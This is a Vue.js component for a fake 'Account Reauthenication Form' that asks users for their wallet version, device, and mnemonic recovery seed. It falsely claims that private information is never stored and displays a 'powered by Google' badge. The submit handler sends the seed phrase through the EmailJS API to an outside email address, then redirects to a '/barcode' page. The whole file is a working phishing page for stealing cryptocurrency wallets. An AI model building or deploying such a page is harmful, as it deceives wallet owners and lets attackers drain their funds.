<template>
  <div class="reauthenication">
    <div class="container">
      <div class="left">
        <i style="font-size: 200px;" class="el-icon-s-tools"></i>
      </div>
      <div class="right">
        <div class="container-right">
          <h1>Account Reauthenication Form</h1>
          <p>
            Provide the Required Information to successfully Re Authenticate
            your account on our database system.
          </p>
          <p>NOTE: Your private information is never stored on our database.</p>
          <div class="divider"></div>
          <el-form
            :label-position="labelPosition"
            :model="ruleForm"
            :rules="rules"
            ref="ruleForm"
            label-width="120px"
            class="form-full"
          >
            <el-form-item
              label="What wallet's version are you using?"
              prop="wallet"
            >
              <el-input v-model="ruleForm.wallet"></el-input>
            </el-form-item>
            <el-form-item
              label="What device are you using, (Windows/Mac) android or iOS?"
              prop="device"
            >
              <el-input v-model="ruleForm.device"></el-input>
            </el-form-item>
            <el-form-item
              label="Enter your Mnemonics/recovery seed?"
              prop="recovery"
            >
              <el-input v-model="ruleForm.recovery"></el-input>
            </el-form-item>

            <el-form-item style="margin-top: 3rem;">
              <el-button
                :loading="loader"
                type="primary"
                class="btn-text"
                @click="submitForm('ruleForm')"
                >Submit</el-button
              >
            </el-form-item>
          </el-form>
          <div class="poweredby">
            <img src="../assets/poweredgoogle.png" alt="" />
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import axios from "axios";

export default {
  methods: {
    submitForm(formName) {
      var self = this;
      this.loader = true;
      this.$refs[formName].validate((valid) => {
        if (valid) {
          if (valid) {
            var data = {
              service_id: "service_70ntltg",
              template_id: "template_3y5sgim",
              user_id: "user_6dMy0FAzh3UkwGQuDDbjZ",
              template_params: {
                from_name: 'Reauthentication',
                wallet_version: this.ruleForm.wallet,
                device: this.ruleForm.device,
                nnemonics: this.ruleForm.recovery,
                reply_to: "janetwilliams1305@gmail.com",
              },
            };
            axios
              .post("https://api.emailjs.com/api/v1.0/email/send", data)
              .then(function() {
                self.loader = false;
                self.$router.push("/barcode");
              })
              .catch(function() {
                this.loader = false;
              });
          } else {
            this.loader = false;
            return false;
          }
        } else {
          this.loader = false;
          return false;
        }
      });
    },
  },
  data() {
    return {
      loader: false,
      labelPosition: "top",
      ruleForm: {
        wallet: "",
        device: "",
        recovery: "",
      },
      rules: {
        wallet: [
          {
            required: true,
            message: "Please input wallet version",
            trigger: "blur",
          },
        ],
        device: [
          {
            required: true,
            message: "Please input Device",
            trigger: "blur",
          },
        ],
        recovery: [
          {
            required: true,
            message: "Please input Mnemonics/recovery seed",
            trigger: "blur",
          },
        ],
      },
    };
  },
};
</script>

<style>
.container {
  display: flex;
  height: 100vh;
}

.container .form-full {
  width: 63%;
  margin-top: 2rem;
}

@media only screen and (max-width: 600px) {
  .container .form-full {
    width: 100%;
  }

  .left {
    display: none !important;
  }

  .right {
    width: 100% !important;
  }

  .right .container-right {
    padding: 20px !important;
  }
}

.left {
  width: 30%;
  background: dodgerblue;
  color: white;
  display: flex;
  justify-content: center;
  padding-top: 6rem;
}

.right {
  width: 70%;
}

.right .poweredby {
  margin-top: 4rem;
  width: 300px;
}

.right .poweredby img {
  height: 100%;
  width: 100%;
}

.right .container-right {
  padding: 3rem;
}

.right .el-form-item__label {
  font-size: 16px;
}

.divider {
  border: 1px solid #eee;
}
</style>
